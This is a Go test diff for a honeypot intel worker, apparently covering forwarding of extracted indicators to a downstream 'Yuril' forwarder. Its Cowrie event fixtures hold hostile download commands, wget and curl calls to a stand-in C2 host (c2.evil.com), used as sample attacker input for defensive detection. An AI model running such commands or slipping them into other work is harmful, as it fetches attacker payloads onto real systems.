@@ -213,3 +213,88 @@ func TestWorkerRepeatedRuns(t *testing.T) {
 		t.Errorf("expected at least 50 TagEvent calls over 50 runs, got %d", db.taggedCount.Load())
 	}
 }
+
+// ---- Yuril forwarder wiring ----
+
+// fakeForwarder records the IOCs handed to it so we can assert the worker
+// actually forwards classified intel downstream.
+type fakeForwarder struct {
+	calls    atomic.Int64
+	iocs     atomic.Int64
+	failNext bool
+}
+
+func (f *fakeForwarder) Forward(ctx context.Context, batchID string, iocs []*database.IOC) error {
+	f.calls.Add(1)
+	f.iocs.Add(int64(len(iocs)))
+	if f.failNext {
+		return io.ErrUnexpectedEOF
+	}
+	return nil
+}
+
+func TestWorkerForwardsIOCs(t *testing.T) {
+	db := &fakeDB{
+		events: []*database.Event{
+			{
+				Honeypot:  "cowrie",
+				EventType: "command",
+				Command:   "wget http://c2.evil.com/payload",
+				SourceIP:  "203.0.113.5",
+				Timestamp: time.Now().UTC(),
+			},
+		},
+	}
+	fwd := &fakeForwarder{}
+	w := newTestWorker(t, db).WithForwarder(fwd)
+	w.runOnce(context.Background())
+
+	if db.iocCount.Load() == 0 {
+		t.Fatal("precondition: expected at least one IOC to be inserted")
+	}
+	if fwd.calls.Load() != 1 {
+		t.Errorf("Forward called %d times, want 1", fwd.calls.Load())
+	}
+	if fwd.iocs.Load() == 0 {
+		t.Error("Forward received 0 IOCs, want >0")
+	}
+}
+
+func TestWorkerNoForwardWhenNoIOCs(t *testing.T) {
+	// login_failed alone produces a tagged event but no extractable IOC of a
+	// forwardable type, so the forwarder should not be invoked.
+	db := &fakeDB{
+		events: []*database.Event{
+			{Honeypot: "cowrie", EventType: "login_failed", SourceIP: "203.0.113.1", Timestamp: time.Now().UTC()},
+		},
+	}
+	fwd := &fakeForwarder{}
+	w := newTestWorker(t, db).WithForwarder(fwd)
+	w.runOnce(context.Background())
+
+	if db.iocCount.Load() == 0 && fwd.calls.Load() != 0 {
+		t.Errorf("Forward called %d times when no IOCs were produced, want 0", fwd.calls.Load())
+	}
+}
+
+func TestWorkerForwardFailureNonFatal(t *testing.T) {
+	db := &fakeDB{
+		events: []*database.Event{
+			{
+				Honeypot:  "cowrie",
+				EventType: "command",
+				Command:   "curl http://c2.evil.com/x",
+				SourceIP:  "203.0.113.9",
+				Timestamp: time.Now().UTC(),
+			},
+		},
+	}
+	fwd := &fakeForwarder{failNext: true}
+	w := newTestWorker(t, db).WithForwarder(fwd)
+	// A forward failure must not panic or stop the worker; runOnce should
+	// still report the events it classified.
+	n := w.runOnce(context.Background())
+	if n != 1 {
+		t.Errorf("runOnce returned %d, want 1 even when forwarding fails", n)
+	}
+}
